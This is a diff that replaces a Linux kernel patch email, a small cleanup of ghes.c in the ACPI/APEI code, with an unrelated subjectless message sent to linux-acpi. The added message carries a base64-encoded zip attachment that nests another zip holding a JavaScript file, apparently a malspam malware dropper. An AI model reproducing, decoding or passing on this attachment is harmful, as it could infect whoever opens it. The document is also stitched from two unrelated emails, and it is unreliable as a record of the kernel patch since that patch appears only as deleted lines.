@@ -1,46 +1,67 @@
-From: Colin King <colin.king@canonical.com>
-Subject: [PATCH] ACPI / APEI: remove redundant variables len and node_len
-Date: Sun, 15 Oct 2017 22:24:54 +0100
-Message-ID: <20171015212454.16012-1-colin.king@canonical.com>
+From: <info@kunstreich-im-pott.de>
+Subject: (unknown)
+Date: Sun, 15 Oct 2017 22:07:34 -0000
+Message-ID: <150810525437.32758.7101939672682757236@telemar.net.br>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 8bit
-Return-path: <linux-kernel-owner@vger.kernel.org>
-Sender: linux-kernel-owner@vger.kernel.org
-To: "Rafael J . Wysocki" <rjw@rjwysocki.net>, Len Brown <lenb@kernel.org>, Tony Luck <tony.luck@intel.com>, Borislav Petkov <bp@alien8.de>, Tyler Baicar <tbaicar@codeaurora.org>, Will Deacon <will.deacon@arm.com>, linux-acpi@vger.kernel.org
-Cc: kernel-janitors@vger.kernel.org, linux-kernel@vger.kernel.org
+Content-Type: application/zip; name="377462.zip"
+Content-Transfer-Encoding: base64
+Return-path: <linux-acpi-owner@vger.kernel.org>
+Received: from 20118135035.host.telemar.net.br ([201.18.135.35]:4402 "HELO
+        telemar.net.br" rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org
+        with SMTP id S1751389AbdJOWHl (ORCPT
+        <rfc822;linux-acpi@vger.kernel.org>); Sun, 15 Oct 2017 18:07:41 -0400
+Content-Disposition: attachment
+Subject: 
+Sender: linux-acpi-owner@vger.kernel.org
 List-Id: linux-acpi@vger.kernel.org
+To: linux-acpi@vger.kernel.org
 
-From: Colin Ian King <colin.king@canonical.com>
-
-Variables len and node_len are redundant and can be removed. Cleans
-up clang warning: node_len = GHES_ESTATUS_NODE_LEN(len);
-
-Signed-off-by: Colin Ian King <colin.king@canonical.com>
----
- drivers/acpi/apei/ghes.c | 3 ---
- 1 file changed, 3 deletions(-)
-
-diff --git a/drivers/acpi/apei/ghes.c b/drivers/acpi/apei/ghes.c
-index 3c3a37b8503b..f2e1049232c0 100644
---- a/drivers/acpi/apei/ghes.c
-+++ b/drivers/acpi/apei/ghes.c
-@@ -923,7 +923,6 @@ static void ghes_print_queued_estatus(void)
- 	struct ghes_estatus_node *estatus_node;
- 	struct acpi_hest_generic *generic;
- 	struct acpi_hest_generic_status *estatus;
--	u32 len, node_len;
- 
- 	llnode = llist_del_all(&ghes_estatus_llist);
- 	/*
-@@ -935,8 +934,6 @@ static void ghes_print_queued_estatus(void)
- 		estatus_node = llist_entry(llnode, struct ghes_estatus_node,
- 					   llnode);
- 		estatus = GHES_ESTATUS_FROM_NODE(estatus_node);
--		len = cper_estatus_len(estatus);
--		node_len = GHES_ESTATUS_NODE_LEN(len);
- 		generic = estatus_node->generic;
- 		ghes_print_estatus(NULL, generic, estatus);
- 		llnode = llnode->next;
--- 
-2.14.1
+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
+AAAAAA==
